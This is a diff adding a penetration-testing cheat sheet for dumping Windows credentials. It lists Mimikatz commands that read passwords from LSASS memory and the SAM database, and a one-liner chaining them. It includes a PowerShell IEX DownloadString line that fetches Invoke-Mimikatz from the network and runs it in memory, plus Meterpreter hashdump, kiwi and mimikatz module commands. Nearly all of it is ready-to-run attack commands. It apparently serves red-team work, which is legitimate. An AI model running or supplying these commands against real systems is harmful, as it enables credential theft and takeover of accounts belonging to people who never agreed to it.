@@ -1,0 +1,44 @@
+--- Mimikatz
+
+
+# desc: Elevate Privileges to extract the credentials
+privilege::debug 
+
+# desc: This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
+token::elevate
+
+# desc: Extract from lsass (memory)
+sekurlsa::logonpasswords
+
+# desc: Extract from SAM
+lsadump::sam
+
+# desc: One liner
+mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"
+
+--- Invoke-Mimikatz
+
+IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
+
+# desc:  desc: Dump creds from memory
+Invoke-Mimikatz -DumpCreds 
+
+Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"'
+
+--- Credentials with Meterpreter
+
+# desc: Credentials from SAM
+post/windows/gather/smart_hashdump
+hashdump
+
+
+# desc: Using kiwi module
+load kiwi
+creds_all
+kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam"
+
+
+# desc: Using Mimikatz module
+load mimikatz
+mimikatz_command -f "sekurlsa::logonpasswords"
+mimikatz_command -f "lsadump::sam"
